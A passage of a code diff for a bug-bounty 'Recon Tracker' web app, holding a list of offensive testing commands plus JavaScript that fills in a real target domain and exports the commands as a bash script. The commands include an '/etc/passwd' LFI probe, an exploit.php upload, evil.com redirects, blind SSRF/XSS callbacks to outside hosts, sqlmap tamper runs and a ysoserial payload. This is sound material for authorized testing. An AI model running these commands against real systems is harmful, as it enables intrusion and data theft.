-silent | httpx -silent -title -tech-detect -o live_full.txt", "type": "active", "new": true, "advanced": true, "chain": true}]}]}, {"title": "2. Discovery and Probing", "subs": [{"title": "2.1 HTTP Probing", "items": [{"name": "HTTPX Probing", "cmd": "httpx -l resolved_subs.txt -p 80,443,8080,8443 -silent -title -sc -ip -o live_websites.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "HTTPX Tech Detection + Screenshots", "cmd": "httpx -l live_websites.txt -title -tech-detect -status-code -follow-redirects -ss -srd screenshots/ -o httpx_tech.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Custom Filtering", "cmd": "cat live_websites.txt | grep -i \"login\\|admin\" | tee login_endpoints.txt", "type": null, "new": false, "advanced": false, "chain": false}]}, {"title": "2.2 JavaScript Analysis", "items": [{"name": "JS Extraction", "cmd": "cat live_websites.txt | waybackurls | grep \"\\.js\" | anew js_files.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "LinkFinder Analysis", "cmd": "python3 linkfinder.py -i js_files.txt -o js_endpoints.txt", "type": null, "new": false, "advanced": false, "chain": false}, {"name": "SecretFinder (live JS secret scan)", "cmd": "python3 SecretFinder.py -i https://target.com/app.js -o cli", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Sensitive Pattern Search", "cmd": "cat js_files.txt | gf aws-keys | tee aws_keys.txt\ncat js_files.txt | gf urls | tee sensitive_urls.txt", "type": null, "new": false, "advanced": false, "chain": false}, {"name": "API Key Validation", "cmd": "curl -X GET \"https://api.example.com/resource\" -H \"Authorization: Bearer <extracted_key>\"", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "2.3 Advanced Google Dorking", "items": [{"name": "Automated Dorking", "cmd": "python3 GitDorker.py -tf <github_token.txt> -q target.com -d dorks.txt -o git_dorks_output.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Admin/Login Files", "cmd": "site:*.example.com inurl:\"*admin | login\" | inurl:.php | .asp", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Config Files", "cmd": "site:*.example.com ext:env | ext:yaml | ext:ini", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Public Keys", "cmd": "site:*.example.com inurl:\"id_rsa.pub\" | inurl:\".pem\"", "type": "passive", "new": false, "advanced": false, "chain": false}]}, {"title": "2.4 URL Discovery", "items": [{"name": "Katana Crawling", "cmd": "katana -list live_websites.txt -jc -o katana_urls.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "Cariddi (crawl + secrets + endpoints)", "cmd": "echo target.com | cariddi -s -ss -info -e -o cariddi_results.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Gospider", "cmd": "gospider -s \"https://target.com\" -d 2 -o gospider_output/", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "Hakrawler", "cmd": "echo \"https://target.com\" | hakrawler -depth 3 -plain -out hakrawler_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "2.5 Archive Enumeration", "items": [{"name": "Archive URL Collection", "cmd": "gau --subs target.com | anew archived_urls.txt\nwaybackurls target.com | anew wayback_urls.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Uro (dedupe noisy archive URLs)", "cmd": "cat archived_urls.txt | uro | anew clean_urls.txt", "type": null, "new": true, "advanced": false, "chain": false}, {"name": "Parameter Extraction", "cmd": "cat archived_urls.txt | grep \"=\" | anew parameters.txt", "type": null, "new": false, "advanced": false, "chain": false}]}, {"title": "2.6 Advanced: JS Diffing & Chained Crawling", "items": [{"name": "JS Diff Monitoring (spot new endpoints over time)", "cmd": "katana -u https://target.com -jc -silent -o js_now.txt && diff js_prev.txt js_now.txt > js_diff.txt", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Crawl-to-Secrets Chain", "cmd": "katana -u https://target.com -jc -silent | grep \"\\.js\" | httpx -silent | xargs -I{} python3 SecretFinder.py -i {} -o cli", "type": "active", "new": true, "advanced": true, "chain": true}, {"name": "GraphQL Introspection Scan", "cmd": "graphql-cop -t https://target.com/graphql", "type": "active", "new": true, "advanced": true, "chain": false}]}]}, {"title": "3. Advanced Enumeration Techniques", "subs": [{"title": "3.1 Parameter Discovery", "items": [{"name": "Arjun Parameter Discovery", "cmd": "arjun -u \"https://target.example.com\" -m GET,POST --stable -o params.json", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "X8 Parameter Discovery (fast, header+body)", "cmd": "x8 -u https://target.com/page -w params_wordlist.txt -o x8_results.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "ParamSpider Web Parameters", "cmd": "python3 paramspider.py --domain target.com --exclude woff,css,js --output paramspider_output.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "FFuF Parameter Bruteforce", "cmd": "ffuf -u https://target.com/page.php?FUZZ=test -w /usr/share/wordlists/params.txt -o parameter_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "3.2 Cloud Asset Enumeration", "items": [{"name": "Cloud Bucket Enumeration", "cmd": "cloud_enum -k target.com -b buckets.txt -o cloud_enum_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "S3 Bucket Access Test", "cmd": "aws s3 ls s3://<bucket_name> --no-sign-request", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "S3 Bucket Content Dump", "cmd": "python3 AWSBucketDump.py -b target-bucket -o dumped_data/", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "3.3 Content Discovery", "items": [{"name": "Feroxbuster", "cmd": "feroxbuster -u https://target.com -w /usr/share/wordlists/common.txt -r -t 20 -o recursive_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "Dirsearch", "cmd": "dirsearch -u https://target.com -w /usr/share/wordlists/content_discovery.txt -e php,html,js,json -x 404 -o dirsearch_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "FFuF Recursive", "cmd": "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/content_discovery.txt -mc 200,403 -recursion -recursion-depth 3 -o ffuf_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "FFuF Virtual Host Discovery", "cmd": "ffuf -u https://target.com -H \"Host: FUZZ.target.com\" -w subdomains.txt -mc 200 -o vhost_results.txt", "type": "active", "new": true, "advanced": false, "chain": false}]}, {"title": "3.4 API Enumeration", "items": [{"name": "Kiterunner", "cmd": "kr scan https://api.target.com -w /usr/share/kiterunner/routes-large.kite -o api_routes.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "Nuclei API Exposure Templates", "cmd": "nuclei -l live_websites.txt -t exposures/apis/ -o api_exposures.txt", "type": "active", "new": true, "advanced": false, "chain": false}]}, {"title": "3.5 ASN Mapping", "items": [{"name": "ASN Lookup", "cmd": "amass intel -asn <ASN_Number> -o asn_ips.txt", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Shodan Enumeration", "cmd": "shodan search \"net:<ip_range>\" --fields ip_str,port --limit 100", "type": "passive", "new": false, "advanced": false, "chain": false}, {"name": "Censys Asset Search", "cmd": "censys search \"autonomous_system.asn:<ASN_Number>\" -o censys_assets.txt", "type": "passive", "new": false, "advanced": false, "chain": false}]}, {"title": "3.6 Advanced: GraphQL, JWT & Deep Parameter Chains", "items": [{"name": "JWT Tool Attack Suite", "cmd": "python3 jwt_tool.py <JWT> -M at -u https://target.com/api", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Clairvoyance (schema recovery w/ introspection off)", "cmd": "clairvoyance -o schema.json https://target.com/graphql", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Param-to-Reflected-XSS Chain", "cmd": "cat parameters.txt | gf xss | Gxss -p test | kxss", "type": "active", "new": true, "advanced": true, "chain": true}]}]}, {"title": "4. Vulnerability Testing", "subs": [{"title": "4.1 High-Priority Vulnerabilities", "items": [{"name": "\ud83d\udc1eCSRF Testing", "cmd": "cat live_websites.txt | gf csrf | tee csrf_endpoints.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "\ud83d\udc1eLFI Testing", "cmd": "cat live_websites.txt | gf lfi | qsreplace \"/etc/passwd\" | xargs -I@ curl -s @ | grep \"root:x:\" > lfi_results.txt", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "\ud83d\udc1eRCE Testing", "cmd": "curl -X POST -F \"file=@exploit.php\" https://target.com/upload", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "\ud83d\udc1eSQLi Testing", "cmd": "ghauri -u \"https://target.com?id=1\" --dbs --batch", "type": "active", "new": false, "advanced": false, "chain": false}, {"name": "\ud83d\udc1eSensitive Data Search", "cmd": "cat js_files.txt | grep -Ei \"key|token|auth|password\" > sensitive_data.txt", "type": null, "new": false, "advanced": false, "chain": false}, {"name": "\ud83d\udc1eOpen Redirect Test", "cmd": "cat urls.txt | grep \"=http\" | qsreplace \"https://evil.com\" | xargs -I@ curl -I -s @ | grep \"evil.com\"", "type": "active", "new": false, "advanced": false, "chain": false}]}, {"title": "4.2 Automated & High-Signal Scans (Latest Tools)", "items": [{"name": "Nuclei Full Scan (critical/high templates)", "cmd": "nuclei -l live_websites.txt -t nuclei-templates/ -severity critical,high -rl 50 -o nuclei_findings.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Nuclei CVE Templates", "cmd": "nuclei -l live_websites.txt -t cves/ -o nuclei_cve_findings.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Subdomain Takeover Check", "cmd": "nuclei -l resolved_subs.txt -t takeovers/ -o takeover_results.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Dalfox XSS Scan", "cmd": "dalfox file urls.txt --waf-bypass -o dalfox_results.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Corsy CORS Misconfiguration Scan", "cmd": "python3 corsy.py -i live_websites.txt -o corsy_results.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "HTTP Request Smuggling (Smuggler)", "cmd": "python3 smuggler.py -u https://target.com -o smuggler_results.txt", "type": "active", "new": true, "advanced": false, "chain": false}, {"name": "Blind SSRF via Interactsh", "cmd": "cat urls.txt | qsreplace \"http://YOUR-UNIQUE-ID.oast.site\" | httpx -silent -o ssrf_candidates.txt", "type": "active", "new": true, "advanced": false, "chain": false}]}, {"title": "4.3 Advanced: Exploit Chains", "items": [{"name": "SSTI Detection (Tplmap)", "cmd": "tplmap -u 'https://target.com/page?name=John'", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "OS Command Injection (Commix)", "cmd": "commix --url=\"https://target.com/page?input=test\" --batch", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Advanced SQLi w/ Tamper Scripts", "cmd": "sqlmap -u \"https://target.com?id=1\" --dbs --batch --tamper=space2comment,between --risk=3 --level=5", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Prototype Pollution Scan", "cmd": "ppmap -f requests.txt", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Race Condition Testing", "cmd": "python3 race_the_web.py config.json", "type": "active", "new": true, "advanced": true, "chain": false}, {"name": "Blind XSS Full Chain", "cmd": "cat urls.txt | dalfox pipe --blind https://YOUR-ID.xss.ht", "type": "active", "new": true, "advanced": true, "chain": true}, {"name": "Java Deserialization Payload (ysoserial, authorized targets only)", "cmd": "java -jar ysoserial.jar CommonsCollections5 'id' > payload.bin", "type": "active", "new": true, "advanced": true, "chain": false}]}]}, {"title": "5. The \"Two-Eye\" Approach \ud83d\udc40", "subs": [{"title": "Actionable Steps", "items": [{"name": "First Eye \u2014 test every gathered subdomain/endpoint/parameter for common vulns", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Second Eye \u2014 hunt for interesting findings (exposed creds, forgotten subdomains, admin panels)", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Build a POC for any confirmed vulnerability and test its real impact", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "No vuln found? Pivot to deeper testing on unique subdomains/endpoints", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}]}]}, {"title": "6. Proof of Concept (POC) Creation", "subs": [{"title": "Capture Evidence", "items": [{"name": "Video POC \u2014 screen-record the exploit end-to-end (OBS Studio)", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Screenshot POC \u2014 capture clear before/after screenshots (Greenshot)", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}]}]}, {"title": "7. Reporting", "subs": [{"title": "Write the Report", "items": [{"name": "Overview \u2014 one-line summary of the vulnerability", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Description \u2014 technical explanation of the issue", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Steps to Reproduce \u2014 numbered, reproducible steps", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Impact \u2014 what an attacker can actually do with it", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Proof of Concept \u2014 attach video/screenshots", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Recommendations \u2014 concrete remediation advice", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "References \u2014 CWE/CVE/OWASP links", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}, {"name": "Keep it clear, concise, and reproducible by anyone", "cmd": null, "type": null, "new": false, "advanced": false, "chain": false}]}]}];
 
 let state = {
   targets: [],      // list of target name strings
@@ -341,6 +474,9 @@ let state = {
 
 const STORAGE_KEY_LIST = 'recon:targets';
 const openSections = new Set([0]); // section 0 open by default
+const expandedItems = new Set(); // keys of items whose command panel is open
+let viewFilter = 'all'; // 'all' | 'passive' | 'active'
+let advancedMode = false;
 
 function itemKey(si, ui, ii){ return si+'-'+ui+'-'+ii; }
 
@@ -409,6 +545,15 @@ function escapeHtml(s){
   return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 }
 
+// Replace the methodology's placeholder hosts with the real target domain.
+// Order-independent: neither placeholder is a substring of the other.
+function substituteTarget(cmd, target){
+  if(!cmd || !target) return cmd;
+  return cmd
+    .split('target.example.com').join(target)
+    .split('target.com').join(target);
+}
+
 function render(){
   renderTargetSelect();
   const main = document.getElementById('mainArea');
@@ -449,18 +594,37 @@ function render(){
       <div class="section-body">`;
 
     s.subs.forEach((u, ui)=>{
+      const visibleItems = u.items.filter(it => (viewFilter==='all' || !it.type || it.type===viewFilter) && (advancedMode || !it.advanced));
+      if(visibleItems.length === 0){
+        const reason = (!advancedMode && u.items.every(it=>it.advanced)) ? 'Switch on Advanced Mode to see these steps.' : `No ${viewFilter} steps here.`;
+        html += `<div class="subsection"><div class="subtitle">${escapeHtml(u.title)}</div><div class="empty-filter">${reason}</div></div>`;
+        return;
+      }
       html += `<div class="subsection"><div class="subtitle">${escapeHtml(u.title)}</div>`;
       u.items.forEach((it, ii)=>{
+        if(viewFilter!=='all' && it.type && it.type!==viewFilter) return;
+        if(it.advanced && !advancedMode) return;
         const key = itemKey(si,ui,ii);
         const isDone = !!(state.data[state.current] && state.data[state.current][key]);
         const hasCmd = !!it.cmd;
-        html += `<div class="item ${isDone?'done':''}" data-key="${key}">
-          <div class="item-row" onclick="toggleItem('${key}', ${hasCmd})">
-            <div class="box"></div>
-            <div class="name">${escapeHtml(it.name)}</div>
-            ${hasCmd ? '<div class="expander">cmd ▾</div>' : ''}
+        const liveCmd = hasCmd ? substituteTarget(it.cmd, state.current) : '';
+        const isExpanded = expandedItems.has(key);
+        let badges = '';
+        if(it.type === 'passive') badges += '<span class="tag-badge passive">PASSIVE</span>';
+        if(it.type === 'active') badges += '<span class="tag-badge active-tag">ACTIVE</span>';
+        if(it.advanced) badges += '<span class="tag-badge advanced">ADVANCED</span>';
+        if(it.chain) badges += '<span class="tag-badge chain">CHAIN</span>';
+        if(it.new && !it.advanced) badges += '<span class="tag-badge new">NEW</span>';
+        html += `<div class="item ${isDone?'done':''} ${isExpanded?'expanded':''}" data-key="${key}">
+          <div class="item-row">
+            <div class="check-area" onclick="toggleItem('${key}')">
+              <div class="box"></div>
+              <div class="name">${escapeHtml(it.name)}</div>
+            </div>
+            ${badges}
+            ${hasCmd ? `<div class="expander" onclick="toggleExpand(event,'${key}')">${isExpanded ? 'cmd ▴' : 'cmd ▾'}</div>` : ''}
           </div>
-          ${hasCmd ? `<div class="item-cmd"><pre>${escapeHtml(it.cmd)}</pre><button class="copy-btn" onclick="copyCmd(event,'${key}')">copy</button></div>` : ''}
+          ${hasCmd ? `<div class="item-cmd"><pre>${escapeHtml(liveCmd)}</pre><button class="copy-btn" onclick="copyCmd(event,'${key}')">copy</button></div>` : ''}
         </div>`;
       });
       html += `</div>`;
@@ -483,24 +647,19 @@ window.toggleSection = function(si){
   render();
 }
 
-window.toggleItem = async function(key, hasCmd){
-  const itemEl = document.querySelector(`.item[data-key="${key}"]`);
-  // if clicking near expander area and has cmd, toggle expand instead of check — simple heuristic: always allow expand via separate click zone
+window.toggleItem = async function(key){
   if(!state.data[state.current]) state.data[state.current] = {};
   state.data[state.current][key] = !state.data[state.current][key];
   await saveChecklist(state.current);
   render();
 }
 
-// separate handler: clicking the "cmd" expander text should not toggle checkbox — use event delegation
-document.addEventListener('click', function(e){
-  const expander = e.target.closest('.expander');
-  if(expander){
-    e.stopPropagation();
-    const itemEl = expander.closest('.item');
-    itemEl.classList.toggle('expanded');
-  }
-});
+window.toggleExpand = function(e, key){
+  e.stopPropagation();
+  if(expandedItems.has(key)) expandedItems.delete(key);
+  else expandedItems.add(key);
+  render();
+}
 
 window.copyCmd = function(e, key){
   e.stopPropagation();
@@ -573,6 +732,67 @@ document.getElementById('deleteTargetBtn').addEventListener('click', async ()=>{
 });
 
 loadState();
+
+document.getElementById('filterSegment').addEventListener('click', (e)=>{
+  const btn = e.target.closest('button[data-filter]');
+  if(!btn) return;
+  viewFilter = btn.dataset.filter;
+  document.querySelectorAll('#filterSegment button').forEach(b=>b.classList.toggle('active', b===btn));
+  render();
+});
+
+document.getElementById('advancedToggle').addEventListener('click', (e)=>{
+  advancedMode = !advancedMode;
+  e.target.textContent = advancedMode ? '🔓 Advanced Mode: On' : '🔒 Advanced Mode: Off';
+  e.target.classList.toggle('on', advancedMode);
+  render();
+});
+
+function exportScript(){
+  if(!state.current){ alert('Add a target first.'); return; }
+  const lines = [
+    '#!/usr/bin/env bash',
+    `# Recon script for ${state.current}`,
+    `# Generated by Recon Tracker — filter: ${viewFilter} | advanced mode: ${advancedMode ? 'on' : 'off'}`,
+    '# Review every command before running. Only use against targets you are authorized to test.',
+    ''
+  ];
+  let anyCmd = false;
+  METHOD.forEach(s=>{
+    const sectionLines = [];
+    s.subs.forEach(u=>{
+      const subLines = [];
+      u.items.forEach(it=>{
+        if(viewFilter!=='all' && it.type && it.type!==viewFilter) return;
+        if(it.advanced && !advancedMode) return;
+        if(!it.cmd) return;
+        subLines.push(`# ${it.name}`);
+        subLines.push(substituteTarget(it.cmd, state.current));
+        subLines.push('');
+        anyCmd = true;
+      });
+      if(subLines.length) sectionLines.push(`## ${u.title}`, ...subLines);
+    });
+    if(sectionLines.length) lines.push(`# ============ ${s.title} ============`, ...sectionLines);
+  });
+
+  if(!anyCmd){
+    alert('No commands match the current filter/mode — nothing to export.');
+    return;
+  }
+
+  const blob = new Blob([lines.join('\n')], {type:'text/plain'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `${state.current.replace(/[^a-z0-9.\-]/gi,'_')}_recon.sh`;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+}
+
+document.getElementById('exportScriptBtn').addEventListener('click', exportScript);
 </script>
 </body>
-</html>f
+</html>
